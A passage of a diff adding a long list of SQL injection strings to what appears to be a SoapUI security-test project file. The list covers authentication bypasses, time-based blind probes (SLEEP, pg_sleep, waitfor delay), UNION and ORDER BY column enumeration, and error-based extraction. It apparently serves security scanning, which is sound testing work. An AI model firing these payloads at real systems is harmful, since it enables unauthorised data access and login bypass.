+        <con:sqlInjectionStrings>ORDER BY 30</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 30#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY SLEEP(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 7300=7300 AND ('pKlZ'='pKlZ</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'&amp;&amp;SLEEP(5)&amp;&amp;'1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 7300=7300 AND ('pKlZ'='pKlY</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>"*"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1)) or sleep(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>''</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or 1=1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 10#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1)) or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" OR "" = "</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3,4#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or 1=1/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 29#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' OR '1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" OR 1 = 1 -- -</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT USER()--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>"-"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1) or sleep(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>benchmark(50000000,MD5(1))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or pg_SLEEP(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3,4--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or 1=1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 18--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>');waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'LIKE'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),"'3'"#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 16#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1' ORDER BY 1--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 7300=7300 AND 'pKlZ'='pKlY</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 7300=7300 AND 'pKlZ'='pKlZ</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 1=1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>') or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 27#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 3--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>-2</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" or 1=1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'\"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' AND MID(VERSION(),1,1) = '5';</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1=1 AND '%'='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>"));waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin") or "1"="1"--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>')) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1 or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>//</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin') or ('1'='1'#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" or 1=1/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 1=0#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'^'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>WHERE 1=1 AND 1=1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 14#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR x=x</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>') or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin"/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1083=1083 AND (1427=1427</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR x=y</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or '1'='1'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 28--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND true</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>and (select substring(@@version,3,1))='c'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>HAVING 1=1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin") or "1"="1"/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>-1' UNION SELECT 1,2,3--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or benchmark(50000000,MD5(1))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1-false</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>';waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 16--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'));waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or '1'='1'/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 3#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>,(select * from (select(sleep(10)))a)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin") or ("1"="1"#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>HAVING 1=0#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' '</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>and (select substring(@@version,2,1))='y'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or SLEEP(5)="</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or SLEEP(5)='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>+ SLEEP(10) + '</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 1=1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 19#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 26--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),"'3</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 5#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or "x"="x</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings>
